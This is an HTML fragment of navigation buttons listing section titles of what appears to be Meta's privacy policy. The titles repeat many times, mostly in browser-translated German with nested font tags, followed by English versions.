                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie verwenden wir Ihre Informationen?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie geben wir Ihre Informationen an Meta Products oder integrierte Partner weiter?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie geben wir Informationen an Dritte weiter?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie ist die Zusammenarbeit zwischen Meta Companies organisiert?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie können Sie Ihre Daten verwalten oder löschen und Ihre Rechte ausüben?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie lange bewahren wir Ihre Daten auf?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie übermitteln wir Informationen?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie reagieren wir auf behördliche Anfragen, halten geltende Gesetze ein und beugen Schäden vor?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Woher wissen Sie, wann sich die Richtlinie ändert?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie stelle ich Metafragen?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Warum und wie wir Ihre Daten verarbeiten</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Was ist die Datenschutzrichtlinie und was deckt sie ab?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Welche Informationen sammeln wir?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie verwenden wir Ihre Informationen?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie geben wir Ihre Informationen an Meta Products oder integrierte Partner weiter?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie geben wir Informationen an Dritte weiter?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie ist die Zusammenarbeit zwischen Meta Companies organisiert?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie können Sie Ihre Daten verwalten oder löschen und Ihre Rechte ausüben?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie lange bewahren wir Ihre Daten auf?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie übermitteln wir Informationen?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie reagieren wir auf behördliche Anfragen, halten geltende Gesetze ein und beugen Schäden vor?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Woher wissen Sie, wann sich die Richtlinie ändert?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie stelle ich Metafragen?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Warum und wie wir Ihre Daten verarbeiten</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Was ist die Datenschutzrichtlinie und was deckt sie ab?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Welche Informationen sammeln wir?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie verwenden wir Ihre Informationen?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie geben wir Ihre Informationen an Meta Products oder integrierte Partner weiter?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie geben wir Informationen an Dritte weiter?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie ist die Zusammenarbeit zwischen Meta Companies organisiert?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie können Sie Ihre Daten verwalten oder löschen und Ihre Rechte ausüben?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie lange bewahren wir Ihre Daten auf?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie übermitteln wir Informationen?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie reagieren wir auf behördliche Anfragen, halten geltende Gesetze ein und beugen Schäden vor?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Woher wissen Sie, wann sich die Richtlinie ändert?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie stelle ich Metafragen?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Warum und wie wir Ihre Daten verarbeiten</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Was ist die Datenschutzrichtlinie und was deckt sie ab?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Welche Informationen sammeln wir?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie verwenden wir Ihre Informationen?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie geben wir Ihre Informationen an Meta Products oder integrierte Partner weiter?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie geben wir Informationen an Dritte weiter?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie ist die Zusammenarbeit zwischen Meta Companies organisiert?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie können Sie Ihre Daten verwalten oder löschen und Ihre Rechte ausüben?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie lange bewahren wir Ihre Daten auf?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie übermitteln wir Informationen?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie reagieren wir auf behördliche Anfragen, halten geltende Gesetze ein und beugen Schäden vor?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Woher wissen Sie, wann sich die Richtlinie ändert?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie stelle ich Metafragen?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Warum und wie wir Ihre Daten verarbeiten</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Was ist die Datenschutzrichtlinie und was deckt sie ab?</font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Welche Informationen sammeln wir?</font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie verwenden wir Ihre Informationen?</font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie geben wir Ihre Informationen an Meta Products oder an integrierte Partner weiter?</font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie geben wir Informationen an Dritte weiter?</font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie ist die Zusammenarbeit zwischen Meta Companies organisiert?</font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie können Sie Ihre Daten verwalten oder löschen und Ihre Rechte ausüben?</font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie lange bewahren wir Ihre Daten auf?</font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie übermitteln wir Informationen?</font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie reagieren wir auf offizielle Anfragen, halten geltende Gesetze ein und verhindern Schäden?</font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie erfahren Sie, wenn sich die Richtlinie ändert?</font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie stellt man Metafragen?</font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Warum und wie wir Ihre Daten verarbeiten</font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Was ist die Datenschutzrichtlinie und was deckt sie ab?</font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Welche Informationen sammeln wir?</font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie verwenden wir Ihre Informationen?</font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie geben wir Ihre Informationen an Meta Products oder an integrierte Partner weiter?</font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie geben wir Informationen an Dritte weiter?</font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie ist die Zusammenarbeit zwischen Meta Companies organisiert?</font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie können Sie Ihre Daten verwalten oder löschen und Ihre Rechte ausüben?</font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie lange bewahren wir Ihre Daten auf?</font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie übermitteln wir Informationen?</font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie reagieren wir auf offizielle Anfragen, halten geltende Gesetze ein und verhindern Schäden?</font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie erfahren Sie, wenn sich die Richtlinie ändert?</font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie stelle ich Metafragen?</font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Warum und wie wir Ihre Daten verarbeiten</font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text">What is the Privacy Policy and what does it cover?</div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text">What information do we collect?</div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text">How do we use your information?</div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text">How do we share your information on Meta Products or with integrated partners?</div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text">How do we share information with third parties?</div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text">How is the cooperation between Meta Companies organized?</div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text">How can you manage or delete your information and exercise your rights?</div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text">How long do we keep your information?</div>
